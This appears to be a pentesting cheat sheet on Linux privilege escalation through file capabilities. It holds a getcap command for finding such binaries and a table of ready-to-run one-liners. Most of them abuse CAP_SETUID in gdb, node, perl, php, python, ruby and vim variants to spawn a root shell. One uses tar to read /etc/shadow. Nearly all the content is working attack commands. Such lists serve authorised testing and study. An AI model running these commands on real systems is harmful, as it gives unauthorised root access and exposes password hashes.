# File Capabilities

Find binaries with capabilities

```bash
getcap -r / 2>/dev/null
```

<table><thead><tr><th width="114"></th><th width="137">Capability</th><th>Command</th></tr></thead><tbody><tr><td>gdb</td><td>CAP_SETUID</td><td><code>./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit</code></td></tr><tr><td>node</td><td>CAP_SETUID</td><td><code>./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'</code></td></tr><tr><td>perl</td><td>CAP_SETUID</td><td><code>./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></td></tr><tr><td>php #1</td><td>CAP_SETUID</td><td><code>CMD="/bin/sh"</code></td></tr><tr><td>php #2</td><td>CAP_SETUID</td><td><code>./php -r "posix_setuid(0); system('$CMD');"</code></td></tr><tr><td>python</td><td>CAP_SETUID</td><td><code>./python -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></td></tr><tr><td>ruby</td><td>CAP_SETUID</td><td><code>./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'</code></td></tr><tr><td>rview</td><td>CAP_SETUID</td><td><code>./rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></td></tr><tr><td>rvim</td><td>CAP_SETUID</td><td><code>./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></td></tr><tr><td>tar</td><td>cap_dac_read_search+ep</td><td><code>tar -cvf shadow.tar /etc/shadow; tar -xvf shadow.tar</code></td></tr><tr><td>view</td><td>CAP_SETUID</td><td><code>./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></td></tr><tr><td>vim</td><td>CAP_SETUID</td><td><code>./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></td></tr><tr><td>vimdiff</td><td>CAP_SETUID</td><td><code>./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></td></tr></tbody></table>

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %}
